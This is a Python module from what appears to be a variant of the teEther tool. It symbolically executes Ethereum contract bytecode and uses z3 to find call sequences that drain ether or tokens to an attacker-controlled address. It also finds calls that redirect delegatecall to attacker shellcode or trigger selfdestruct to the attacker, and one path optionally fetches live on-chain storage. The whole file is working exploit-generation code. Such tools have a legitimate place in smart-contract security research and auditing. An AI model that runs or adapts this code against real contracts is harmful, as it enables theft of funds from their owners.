import itertools
import logging
from collections import defaultdict

from z3 import z3

import teether.util.utils
from teether.cfg import opcodes
from teether.constraints import check_model_and_resolve, model_to_calls
from teether.evm.evm import Context, run
from teether.evm.exceptions import IntractablePath
from teether.evm.results import CombinedSymbolicResult
from teether.evm.state import LazySubstituteState, SymRead
from teether.util.z3_extra_util import concrete

import json

class InfeasibleExploit(Exception):
    pass


class ExploitContext(object):
    def __init__(self, target_addr, shellcode_addr, target_amount, amount_check, initial_balance, initial_storage,
                 controlled_addrs=set(), sha_calcs=dict(), initial_token_balances=dict()):
        self.target_addr = target_addr
        self.shellcode_addr = shellcode_addr
        self.target_amount = target_amount
        self.amount_check = amount_check
        self.initial_balance = initial_balance
        self.initial_storage = initial_storage

        # assume we control the target address
        self.controlled_addrs = controlled_addrs | {target_addr}

        self.sha_calcs = sha_calcs
        self.initial_token_balances = initial_token_balances


def exploit_constraints_return(comb, ctx):
    extra_constraints = []

    calldata = z3.Array('CALLDATA_%d' % comb.results[-1].xid, z3.BitVecSort(256), z3.BitVecSort(8))
    new_calldata = z3.Store(z3.Store(z3.Store(z3.Store(z3.K(z3.BitVecSort(256), z3.BitVecVal(0,8)), 0, 0x70), 1, 0xa0),2, 0x82), 3, 0x31)
    for i,x in enumerate(ctx.target_addr.to_bytes(32, byteorder='big')):
        new_calldata = z3.Store(new_calldata,i+4,x)
    extra_subst = [(calldata, new_calldata)]

    comb._states = [LazySubstituteState(s, extra_subst) for s in comb._states]
    comb._constraints = [z3.substitute(c, extra_subst) for c in comb._constraints]
    comb._sha_constraints = {
        sha: z3.substitute(sha_value, extra_subst) if not isinstance(sha_value, SymRead) else sha_value
        for sha, sha_value in comb._sha_constraints.items()}

    mstart, msz = comb.state.stack[-1], comb.state.stack[-2]
    mm = comb.state.memory[mstart:mstart+msz]
    if all(concrete(m) for m in mm):
        raise InfeasibleExploit
    new_balance = z3.simplify(z3.Concat([m if not concrete(m) else z3.BitVecVal(m, 8) for m in mm]))
    old_balance = ctx.initial_token_balances[ctx.target_addr]
    if ctx.amount_check == '+':
        extra_constraints.append(z3.UGE(new_balance, old_balance + ctx.target_amount))
    elif ctx.amount_check == '-':
        extra_constraints.append(z3.UGT(new_balance, old_balance))
        extra_constraints.append(z3.ULE(new_balance, old_balance + ctx.target_amount))
    else:
        extra_constraints.append(new_balance == old_balance + ctx.target_amount)


    return extra_constraints



def exploit_constraints_log3(r, ctx):

    sig_hash, s_addr, t_addr = r.states[-2].stack[-3], r.states[-2].stack[-4], r.states[-2].stack[-5]
    if not concrete(sig_hash):
        sig_hash = z3.simplify(sig_hash)
    if not concrete(t_addr):
        t_addr = z3.simplify(t_addr)
    if not concrete(s_addr):
        s_addr = z3.simplify(s_addr)

    extra_constraints = []

    # for now just check if is keccak256('Transfer(address,address,uint256)')
    if not concrete(sig_hash):
        extra_constraints.append(sig_hash == 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef)
    else:
        if sig_hash != 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef:
            raise InfeasibleExploit

    if not concrete(t_addr):
        extra_constraints.append(z3.Extract(159,0,t_addr) == ctx.target_addr)
    else:
        if t_addr != ctx.target_addr:
            raise InfeasibleExploit

    '''
    # We only care about tokens from addresses different to ours
    if not concrete(s_addr):
        extra_constraints.append(z3.Extract(159,0,s_addr) != ctx.target_addr)
    else:
        if s_addr == ctx.target_addr:
            raise InfeasibleExploit
    '''

    for res in r.results:
        callvalue = z3.BitVec('CALLVALUE_%d' % res.xid, 256)
        extra_constraints.append(z3.ULE(callvalue, 0))

    '''
    all_extra_constraints = [(extra_constraints, [])]
    
    if not r.symbolic_storage and ctx.sha_calcs and r.sha_constraints:
        for symb_hash, symb_val in r.sha_constraints.items():
            temp_constraints = []
            for conc_val, conc_hash in ctx.sha_calcs.items():
                for constraints, sha_exclude in all_extra_constraints:
                    new_constraints = constraints.copy()
                    new_constraints.append(conc_val == symb_val)
                    new_constraints.append(conc_hash == symb_hash)
                    temp_constraints.append((new_constraints, sha_exclude + [symb_hash]))
            all_extra_constraints += temp_constraints
    '''

    return extra_constraints


def exploit_constraints_call(r, ctx):
    argstart, argsz = r.state.stack[-4], r.state.stack[-5]
    if not concrete(argstart):
        argstart = z3.simplify(argstart)
    if not concrete(argsz):
        argsz = z3.simplify(argsz)

    if not concrete(argsz) or argsz not in [0x44, 0x64]:
        raise InfeasibleExploit

    func_hash = r.state.memory[argstart:argstart+4]
    if not all(concrete(m) for m in func_hash) or \
            teether.util.utils.bytes_to_int(func_hash) not in [0xa9059cbb, 0x095ea7b3, 0x23b872dd]:
        raise InfeasibleExploit

    extra_constraints = []

    if argsz == 0x64:
        spender = r.state.memory[argstart+0x04:argstart+0x24]
        if not all(concrete(m) for m in spender):
            spender = z3.simplify(z3.Concat([m if not concrete(m) else z3.BitVecVal(m, 8) for m in spender]))
            extra_constraints.append(spender != ctx.target_addr)
        else:
            if teether.util.utils.bytes_to_int(spender) == ctx.target_addr:
                raise InfeasibleExploit

    recipient = r.state.memory[argstart+(argsz-0x40):argstart+(argsz-0x20)]
    if not all(concrete(m) for m in recipient):
        recipient = z3.simplify(z3.Concat([m if not concrete(m) else z3.BitVecVal(m, 8) for m in recipient]))
        extra_constraints.append(recipient == ctx.target_addr)
    else:
        if teether.util.utils.bytes_to_int(recipient) != ctx.target_addr:
            raise InfeasibleExploit

    transfer_amount = r.state.memory[argstart+(argsz-0x20):argstart+argsz]
    if not all(concrete(m) for m in transfer_amount):
        transfer_amount = z3.simplify(z3.Concat([m if not concrete(m) else z3.BitVecVal(m, 8) for m in transfer_amount]))
        if ctx.amount_check == '+':
            extra_constraints.append(z3.UGE(transfer_amount, ctx.target_amount))
        elif ctx.amount_check == '-':
            extra_constraints.append(z3.UGT(transfer_amount, 0))
            extra_constraints.append(z3.ULE(transfer_amount, ctx.target_amount))
        else:
            extra_constraints.append(transfer_amount == ctx.target_amount)

    call_amount = r.state.stack[-3]
    if not concrete(call_amount):
        call_amount = z3.simplify(call_amount)

    if not concrete(call_amount):
        extra_constraints.append(call_amount == 0)
    else:
        if call_amount != 0:
            raise InfeasibleExploit

    token_addr = r.state.stack[-2]
    if not concrete(token_addr):
        token_addr = z3.simplify(token_addr)

    if not concrete(token_addr):
        extra_constraints.append(token_addr == 0x4000000000000000000000000000000000000001)
    else:
        if token_addr != 0x4000000000000000000000000000000000000001:
            raise InfeasibleExploit

    for res in r.results:
        callvalue = z3.BitVec('CALLVALUE_%d' % res.xid, 256)
        extra_constraints.append(z3.ULE(callvalue, 0))

    return [(extra_constraints, [])]


def exploit_constraints_call_old(r, ctx):
    addr = r.state.stack[-2]
    if not concrete(addr):
        addr = z3.simplify(addr)

    amount = r.state.stack[-3]
    if not concrete(amount):
        amount = z3.simplify(amount)

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == ctx.target_addr)
    else:
        if addr != ctx.target_addr:
            raise InfeasibleExploit

    if not concrete(amount):
        if ctx.amount_check == '+':
            extra_constraints.append(z3.UGE(amount, ctx.target_amount))
        elif ctx.amount_check == '-':
            extra_constraints.append(z3.UGT(amount, 0))
            extra_constraints.append(z3.ULE(amount, ctx.target_amount))
        else:
            extra_constraints.append(amount == ctx.target_amount)
        final_balance = r.state.balance
        extra_constraints.append(z3.ULE(amount, final_balance))

    # ensure we're not spending more for this exploit than we gain
    total_spent = None
    for res in r.results:
        callvalue = z3.BitVec('CALLVALUE_%d' % res.xid, 256)
        extra_constraints.append(z3.ULE(callvalue, 10 * (10 ** 18)))  # keep it semi-reasonable: at most 10 Eth per call
        if total_spent is None:
            total_spent = callvalue
        else:
            total_spent += callvalue

    extra_constraints.append(z3.ULT(total_spent, amount))

    # also, ensure the contract does not require a unreasonable start-balance (>100 Eth)
    if not ctx.initial_balance:
        start_balance = z3.BitVec('BALANCE_%d' % r.results[0].xid, 256)
        extra_constraints.append(z3.ULE(start_balance, 100 * (10 ** 18)))

    return [(extra_constraints, [])]


def exploit_constraints_callcode(r, ctx):
    addr = z3.simplify(r.state.stack[-2])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == ctx.shellcode_addr)
    else:
        if addr != ctx.shellcode_addr:
            raise InfeasibleExploit

    return [(extra_constraints, [])]


def exploit_constraints_delegatecall(r, ctx):
    addr = z3.simplify(r.state.stack[-2])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == ctx.shellcode_addr)
    else:
        if addr != ctx.shellcode_addr:
            raise InfeasibleExploit

    return [(extra_constraints, [])]


def exploit_constraints_selfdestruct(r, ctx):
    addr = z3.simplify(r.state.stack[-1])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == ctx.target_addr)
    else:
        if addr != ctx.target_addr:
            raise InfeasibleExploit

    return [(extra_constraints, [])]


EXPLOIT_CONSTRAINTS = {
    'LOG3': exploit_constraints_log3,
    'CALL': exploit_constraints_call,
    'CALLCODE': exploit_constraints_callcode,
    'DELEGATECALL': exploit_constraints_callcode,
    'SELFDESTRUCT': exploit_constraints_selfdestruct,
    'RETURN': exploit_constraints_return
}


def get_exploit_constraints(r, ctx):
    target_op = r.results[-1].target_op
    if target_op in EXPLOIT_CONSTRAINTS:
        return EXPLOIT_CONSTRAINTS[target_op](r, ctx)
    else:
        return [[]]


def control_address_constraints(sym_addr, controlled_addrs):
    sub_exprs = [sym_addr == controlled_addr for controlled_addr in controlled_addrs]
    expr = sub_exprs[0]
    for sub_expr in sub_exprs[1:]:
        expr = z3.Or(expr, sub_expr)
    return expr


def attempt_exploit_outer(working_res, results, ctx, chain=None, direct_attack=False):
    if not direct_attack:
        return attempt_exploit(results, ctx, chain, False)

    for res in working_res:
        try:
            return attempt_exploit(results + [res], ctx, chain, True)
        except InfeasibleExploit:
            continue

    raise InfeasibleExploit


def attempt_exploit(results, ctx, chain=None, direct_attack=False):
    c = CombinedSymbolicResult(symbolic_storage=chain is not None)
    for r in results[::-1]:
        c.prepend(r)
    c.combine(ctx.initial_storage, ctx.initial_balance)
    c.simplify()
    extra_constraints = get_exploit_constraints(c, ctx)

    if direct_attack:
        extra_constraints += EXPLOIT_CONSTRAINTS['LOG3'](c, ctx)

    for res in c.results:
        origin = z3.BitVec('ORIGIN_%d' % res.xid, 256)
        caller = z3.BitVec('CALLER_%d' % res.xid, 256)
        # ensure we control the origin
        extra_constraints.append(control_address_constraints(origin, ctx.controlled_addrs))
        # and ensure the caller is either the origin or the shellcode address
        extra_constraints.append(control_address_constraints(caller, {origin, ctx.shellcode_addr}))

    try:
        model = check_model_and_resolve(c.constraints + extra_constraints, c.sha_constraints,
                                        ctx.sha_calcs if not c.symbolic_storage else None)

        # enforce we control all ORIGIN-addresses
        if any(model[v].as_long() not in ctx.controlled_addrs for v in model if v.name().startswith('ORIGIN')):
            raise InfeasibleExploit

        if c.symbolic_storage:
            addresses = set(filter(lambda x: x not in ctx.initial_storage,
                                   map(lambda x: model.eval(model[x]).as_long(),
                                       filter(lambda x: x.name().split('_')[0] in 'SLOAD', model))))

            # if SLOADs are only performed on already checked storage
            # addresses the symbolic storage should not matter?
            if not addresses:
                calls = model_to_calls(model, c.idx_dict)
                if direct_attack:
                    del calls[-1]
                return calls, c, model

            update_storage(addresses, ctx.initial_storage, chain)

            return attempt_exploit(results, ctx, None, direct_attack)

        else:
            calls = model_to_calls(model, c.idx_dict)
            if direct_attack:
                del calls[-1]
            return calls, c, model

    except IntractablePath:
        raise InfeasibleExploit

def update_storage(addresses, initial_storage, chain):
    for x in addresses:
        initial_storage[x] = teether.util.utils.bytes_to_int(
            chain.eth.getStorageAt("0x4000000000000000000000000000000000000000", hex(x)))


def get_balance_and_sha(p, addr, storage):
    sha_save = dict()
    ctx = Context()
    ctx.calldata = (
            bytearray.fromhex("70a08231") +  # hash of balanceOf
            bytearray(addr.to_bytes(32, byteorder='big'))
    )
    ctx.storage.update(storage)
    state = run(p.prg, code=p.code, ctx=ctx, sha_save=sha_save)
    if "return_value" not in state.__dict__:
        logging.warning(f"Could not retrieve token balance of {hex(addr)}, defaulting to 0")
        state.return_value = 0
    return state.return_value, sha_save


def combined_exploit(p, target_addr, shellcode_addr, target_amount, amount_check='+', initial_storage=dict(),
                     initial_balance=None,
                     max_calls=3, controlled_addrs=set(), flags=None, storage_output=None, chain=None):

    indirect_run = flags == {'CALL'}
    direct_run = flags == {'LOG3'}

    flags = flags or set(opcodes.CRITICAL)

    sha_save = dict()
    initial_token_balances = dict()
    working_res = []
    if direct_run:

        check_addrs = [target_addr, 0x4321]

        for addr in check_addrs:
            balance, sha_results = get_balance_and_sha(p, addr, initial_storage)
            if addr != target_addr:
                sha_save.update(sha_results)
            initial_token_balances[addr] = balance

        return_ins = p.cfg.filter_ins('RETURN')
        constraints = p.get_constraints(return_ins)
        for _, _, res in constraints:
            try:
                calldata = z3.Array('CALLDATA_%d' % res.xid, z3.BitVecSort(256), z3.BitVecSort(8))
                new_calldata = z3.Store(z3.Store(z3.Store(z3.Store(z3.K(z3.BitVecSort(256), z3.BitVecVal(0,8)), 0, 0x70), 1, 0xa0),2, 0x82), 3, 0x31)
                for i,x in enumerate(target_addr.to_bytes(32, byteorder='big')):
                    new_calldata = z3.Store(new_calldata,i+4,x)
                extra_subst = [(calldata, new_calldata)]

                n_constraints = [z3.substitute(c, extra_subst) for c in res.constraints]
                n_sha_constraints = {
                    sha: z3.substitute(sha_value, extra_subst) if not isinstance(sha_value, SymRead) else sha_value
                    for sha, sha_value in res.sha_constraints.items()}
                check_model_and_resolve(n_constraints,n_sha_constraints)
                working_res.append(res)
            except IntractablePath:
                continue

    ctx = ExploitContext(target_addr, shellcode_addr, target_amount, amount_check, initial_balance, initial_storage,
                         controlled_addrs, sha_save, initial_token_balances)

    try:
        sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}

        critical_paths = []

        for op in opcodes.CRITICAL:
            if op not in flags:
                continue
            ins = p.cfg.filter_ins(op)
            if not ins:
                logging.info('No %s instructions', op)
                continue
            logging.info('Found %d %s instructions', len(ins), op)
            constraints = p.get_constraints(ins, opcodes.CRITICAL_ARGS[op], find_memory=indirect_run)
            for i, i_path, i_r in constraints:
                logging.info("%s: %s", op, i)
                logging.info("Path: %s", '->'.join('%x' % p for p in i_path))
                if set(i_path) & sload_bbs:
                    # if there is a SLOAD on this path,
                    # it might benefit from prepending a state-changing path later
                    critical_paths.append(i_r)
                try:
                    return attempt_exploit_outer(working_res, [i_r], ctx, chain=chain, direct_attack=direct_run)
                except InfeasibleExploit:
                    continue

        if not critical_paths:
            logging.warning("No state-dependent critical path found, aborting")
            return

        end_ins = p.cfg.filter_ins('RETURN') + p.cfg.filter_ins('STOP')
        if not end_ins:
            logging.info('No RETURN or STOP instructions')
            return
        logging.info('Found %d RETURN and STOP instructions', len(end_ins))
        compatible = defaultdict(lambda: [[]])  # list of lists
        state_changing_paths = []
        for i, (end, end_path, state_changing_r) in enumerate(p.get_constraints(end_ins, find_sstore=True)):
            logging.info("End: %s", end)
            logging.info("Path: %s", '->'.join('%x' % p for p in end_path))
            state_changing_paths.append(state_changing_r)
            for j, critical_r in enumerate(critical_paths):
                if not critical_r.may_read_from(state_changing_r):
                    continue
                compatible[j][0].append(i)
                try:
                    return attempt_exploit_outer(working_res, [state_changing_r, critical_r], ctx,
                                                 chain=chain, direct_attack=direct_run)
                except InfeasibleExploit:
                    continue

        logging.info('All ends: %s', state_changing_paths)

        storage_compatible = defaultdict(list)
        for (i, a_r), (j, b_r) in itertools.product(enumerate(state_changing_paths), enumerate(state_changing_paths)):
            if a_r.may_read_from(b_r):
                storage_compatible[i].append(j)

        calls = [state_changing_paths]
        while len(calls) < max_calls - 1:
            new_ends = [r.copy() for r in state_changing_paths]
            calls.append(new_ends)
            for k, v in compatible.items():
                new_compat = set()
                for c in v[-1]:
                    new_compat.update(storage_compatible[c])
                v.append(sorted(new_compat))
            for i, critical_r in enumerate(critical_paths):
                for combo_ids in itertools.product(*compatible[i]):
                    combo = [critical_r] + [c[j] for c, j in zip(calls, combo_ids)]
                    try:
                        return attempt_exploit_outer(working_res, combo[::-1], ctx, chain=chain, direct_attack=direct_run)
                    except InfeasibleExploit:
                        continue

        logging.info('Could not exploit any RETURN+CALL')
    finally:
        if chain and ctx.initial_storage:
            with open(storage_output, 'w') as f:
                json.dump({"0x{0:0{1}x}".format(k,64): "0x{0:0{1}x}".format(v,64) for k, v in ctx.initial_storage.items()}, f)

